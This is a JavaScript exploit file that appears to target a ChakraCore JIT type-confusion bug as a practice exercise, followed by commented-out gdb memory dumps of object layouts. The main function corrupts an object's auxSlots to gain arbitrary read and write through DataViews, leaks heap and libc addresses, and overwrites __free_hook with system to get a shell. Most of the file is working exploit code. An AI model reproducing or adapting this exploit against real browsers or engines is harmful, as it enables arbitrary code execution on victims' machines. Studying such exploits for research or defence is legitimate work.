function breakpoint(){
    // b Js::Math::Cosh(Js::RecyclableObject*, Js::CallInfo, ...)
    Math.cosh();
}

/*

https://github.com/microsoft/ChakraCore/blob/master/bin/ch/WScriptJsrt.cpp

gdb-peda$ b WScriptJsrt::EchoCallback(void*, bool, void**, unsigned short, void*)
Breakpoint 4 at 0x55555578c849: file /c/work/practice/browser/ChakraCore/bin/ch/WScriptJsrt.cpp, line 135.
gdb-peda$ commands
Type commands for breakpoint(s) 4, one per line.
End with a line saying just "end".
>print arguments[1]
>end
*/

function opt (o, proto, value) {
    o .b = 1 ;
    let tmp = {__proto__: proto};
    o.a = value;
}

function main() {

    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {});
    }

    // THIS DATAVIEW WILL BE USED TO OVERWRITE dv2
    dv1 = new DataView(new ArrayBuffer(0x100));
    dv1[0] = 0x58585858;
    // THIS DATAVIEW WILL BE USED TO 
    dv2 = new DataView(new ArrayBuffer(0x100));
    // THIS OBJECT WILL HAVE LAYOUT 1
    let obj = {};
    obj.unu = 0x41414141;
    obj.doi = 2;
    obj.trei = 3;
    obj.patru = 4;
    obj.cinci = 5;
    obj.sase = 6;
    obj.sapte = 7;
    obj.opt = 8;
    obj.noua = 9;
    // THIS OBJECT WILL HAVE LAYOUT 3
    let o = {a: 1, b: 2};
    // SET o->auxSlots = obj
    opt (o, o, obj); 
    
    o.c = dv1;
    obj.opt = dv2;
    
    let leak = parseInt("0x" + dv1.getUint32(4, true).toString(16) + dv1.getUint32(0, true).toString(16), 16);
    let leak_high = parseInt("0x" + dv1.getUint32(4, true).toString(16), 16);
    console.log("0x" + dv1.getUint32(4, true).toString(16) + dv1.getUint32(0, true).toString(16)); //   

    function read(where1, where2){
        
        dv1.setUint32(7*0x8, where1, true);
        dv1.setUint32(7*0x8+0x4, where2, true);
        
        return '0x' + dv2.getUint32(4, true).toString(16) + dv2.getUint32(0, true).toString(16);
    };

    function write(what1, what2, where1, where2){

        dv1.setUint32(7*0x8, where1, true);
        dv1.setUint32(7*0x8+0x4, where2, true);

        dv2.setUint32(0, what1, true);
        dv2.setUint32(0x4, what2, true);

    };

    free_got = 0x00000000023354d0;
    target_leak = leak - 0x22d0d00 + free_got;
    console.log("Target="+target_leak);

    let libc_leak = parseInt(read(target_leak % 0x100000000, leak_high),16) - 0x97950; // 0x7ffff67b2000
    let free_hook = libc_leak + 0x3ed8e8; 
    console.log("Free_hook="+free_hook.toString(16))
    let system = libc_leak + 0x4f440;
    console.log('>>'+'0x'+libc_leak.toString(16));

    write(system%0x100000000, system/0x100000000, free_hook%0x100000000, free_hook/0x100000000);

    console.log("/bin/sh\x00")

    // print(o);
}

main();


/*

plan: object1 has 2 fields: a / b
we make the function hot and then we will be able to overwrite the auxSlot with an arbitrary pointer 
using .a

I will overwrite auxSlot with another object object2.

*/


// ==================================================================
// ===================== INSPECT MEMORY CHANGES FOR OBJECT LAYOUT
// ==================================================================
// let o = {a: 0x41414141, b: 0x42424242};
// breakpoint()

// let t = {__proto__: o}
// breakpoint()

// t.a = 0x58585858
// breakpoint()

// ==================================================================
// =========================== OBJECT IN MEMORY
// ==================================================================

// let p1 = {a:0x41414141, b:0x42424242, c:0x43434343, d:0x44444444};
// print(p1);
// breakpoint();
/*
gdb-peda$ tele 0x7f9d3d1af010-0x10 20
0000| 0x7f9d3d1af000 --> 0x7f9d3d086f60 (:DynamicObject+16>:    0x00007f9d3c3d7b50)
0008| 0x7f9d3d1af008 --> 0x7f9d3d1ae040 --> 0x1c
0016| 0x7f9d3d1af010 --> 0x1000041414141
0024| 0x7f9d3d1af018 --> 0x1000042424242
0032| 0x7f9d3d1af020 --> 0x1000043434343
0040| 0x7f9d3d1af028 --> 0x1000044444444
*/

// ==================================================================
// ============== OBJECT 2 IN MEMORY ADDING NEW ELEMENT LATER
// ==================================================================

// let p2 = {caca:0xcaca, baba:0xbaba};
// breakpoint();
/*
gdb-peda$ tele 0x7f46bdaf9ab0-0x10
0000| 0x7f46bdaf9aa0 --> 0x7f46bda4ef60 (:DynamicObject+16>:    0x00007f46bcd9fb50)
0008| 0x7f46bdaf9aa8 --> 0x7f46bdafdb00 --> 0x1c
0016| 0x7f46bdaf9ab0 --> 0x100000000caca
0024| 0x7f46bdaf9ab8 --> 0x100000000baba
*/
// p2.a = 0x11111111;
// breakpoint();
/*
gdb-peda$ tele 0x7f46bdaf9ab0-0x10
0000| 0x7f46bdaf9aa0 --> 0x7f46bda4ef60 (:DynamicObject+16>:    0x00007f46bcd9fb50)
0008| 0x7f46bdaf9aa8 --> 0x7f46bdafdb80 --> 0x1c
0016| 0x7f46bdaf9ab0 --> 0x7f46bdaf9ae0 --> 0x100000000caca
0024| 0x7f46bdaf9ab8 --> 0x0
*/

/*
gdb-peda$ tele 0x7f46bdaf9ae0
0000| 0x7f46bdaf9ae0 --> 0x100000000caca
0008| 0x7f46bdaf9ae8 --> 0x100000000baba
0016| 0x7f46bdaf9af0 --> 0x1000011111111
*/
// p2.b = 0x22222222;
// p2.c = 0x33333333;
// p2.d = 0x44444444;
// print(p2);   
// breakpoint();

/*
gdb-peda$ tele 0x7fd544d09a80-0x20
0000| 0x7fd544d09a60 --> 0x7fdd4a8daf60 (:DynamicObject+16>:    0x00007fdd49c2bb50)
0008| 0x7fd544d09a68 --> 0x7fd544d0db80 --> 0x1c
0016| 0x7fd544d09a70 --> 0x7fd544d09a80 --> 0x1000011111111
0024| 0x7fd544d09a78 --> 0x0
0032| 0x7fd544d09a80 --> 0x1000011111111
0040| 0x7fd544d09a88 --> 0x1000022222222
0048| 0x7fd544d09a90 --> 0x1000033333333
0056| 0x7fd544d09a98 --> 0x1000044444444
*/

// ==================================================================
// ========================== ARRAY IN MEMORY
// ==================================================================

// let p3 = [0x11111111,0x22222222,0x33333333,0x44444444]
// print(p3);
// breakpoint();
